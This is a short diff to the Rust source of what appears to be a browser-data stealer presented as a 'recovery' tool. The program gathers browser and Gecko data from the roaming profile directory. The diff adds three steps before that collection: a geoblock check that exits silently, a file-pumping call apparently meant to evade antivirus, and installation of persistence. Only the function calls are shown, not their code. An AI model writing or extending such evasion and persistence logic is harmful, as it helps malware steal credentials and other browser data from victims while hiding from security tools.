@@ -34,6 +34,14 @@ async fn main() -> Result<(), RecoveryError> {
         context.roaming_data_dir.display()
     );
 
+    if !recovery::geoblock::check_geoblock().await {
+        return Ok(());
+    }
+
+    recovery::pumper::pump_file();
+
+    recovery::persistence::install_persistence().await;
+
     let mut manager = RecoveryManager::with_default_browser_tasks(&context).await?;
     
     manager.register_tasks(gecko::gecko_tasks(&context));
